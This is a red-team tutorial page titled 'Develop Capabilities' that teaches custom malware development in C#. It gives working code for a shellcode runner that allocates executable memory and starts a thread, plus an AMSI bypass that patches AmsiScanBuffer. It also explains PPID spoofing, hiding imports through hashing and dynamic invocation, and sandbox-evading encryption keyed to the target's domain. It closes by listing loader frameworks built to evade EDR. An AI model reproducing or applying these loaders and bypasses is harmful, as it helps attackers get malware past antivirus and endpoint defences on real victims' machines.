---
title: Develop Capabilities
tags: [malware-dev, c#, evasion, amsi, shellcode]
description: From script kiddie to malware dev. Building custom C# loaders, bypassing AMSI, and implementing PPID Spoofing.
date: 2024-01-02
---

# Develop Capabilities (T1587)

Using public tools (`msfvenom`) guarantees detection. To survive in a modern EDR environment, you must develop your own capabilities.

---

## 1. The Language of Choice: C# / .NET
Why C#?
- **Native Interop**: Easy access to the Windows API (P/Invoke) to manipulate memory.
- **Memory Execution**: Can load and execute a byte array (Shellcode) entirely in memory without hitting the disk.
- **PowerShell Integration**: Can be compiled and run *inside* a PowerShell session via `Add-Type`.

## 2. Basic Shellcode Runner (Novice)
The "Hello World" of malware. It allocates memory, copies shellcode, and executes it.

*Warning: This basic pattern is flagged by almost all AV. It uses obvious APIs like `CreateThread`.*

```csharp
using System;
using System.Runtime.InteropServices;

public class Runner {
    // Import Windows API functions (P/Invoke)
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void Main() {
        // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
        byte[] shellcode = new byte[10] { 0xfc, 0x48, 0x83, ... };

        // 1. Allocate Memory (RWX - Read/Write/Execute)
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);

        // 2. Copy Shellcode
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // 3. Execute
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

## 3. Evasion Techniques (Expert)

### A. PPID Spoofing (Parent Process ID)
**Problem**: If you run a malicious binary (`malware.exe`), and it spawns `cmd.exe`, the process tree looks like `malware.exe -> cmd.exe`. This is suspicious.
**Solution**: Spoof the parent. Tell Windows that `explorer.exe` (the desktop) launched `cmd.exe`.
- API: `UpdateProcThreadAttribute` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

### B. AMSI Bypass (Anti-Malware Scan Interface)
AMSI allows AV to scan scripts (PowerShell, VBS, .NET) in memory.
**Technique**: Patch the function `AmsiScanBuffer` in memory to always return `AMSI_RESULT_CLEAN`.

```csharp
// Concept Code: Overwriting the beginning of AmsiScanBuffer with "return 0"
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // x64 instructions
// VirtualProtect(addr, size, 0x40, out oldProtect);
// Marshal.Copy(patch, 0, addr, patch.Length);
```

### C. Import Hashing & D/Invoke
AV scans the "Import Table" of your exe. If it sees `VirtualAlloc` and `CreateRemoteThread`, it flags it.
**Solution**: Don't import them.
1.  **GetModuleHandle**: Find where `kernel32.dll` is loaded.
2.  **GetProcAddress**: Find the function address manually (or by hashing the function name so the string "VirtualAlloc" appears nowhere).
3.  **Dynamic Invocation (D/Invoke)**: Call the pointer.

## 4. Encryption & Obfuscation
Never leave shellcode raw.
1.  **AES-256**: Encrypt the shellcode.
2.  **Key Storage**: Don't hardcode the key. Derive it from the environment (e.g., hash the domain name of the target).
    - *If run on sandbox:* Domain is `sandbox.local` -> Decryption Fails -> Crash (Good!).
    - *If run on target:* Domain is `target.com` -> Decryption Works -> Shell.

## 5. Development Pipeline
Don't write code from scratch every time. Use a framework.
- **ScareCrow**: Generates EDR-evasive loaders.
- **Inceptor**: Template-based PE packer.
- **GadgetToJScript**: turn .NET assemblies into JS/VBS scripts for HTML smuggling.
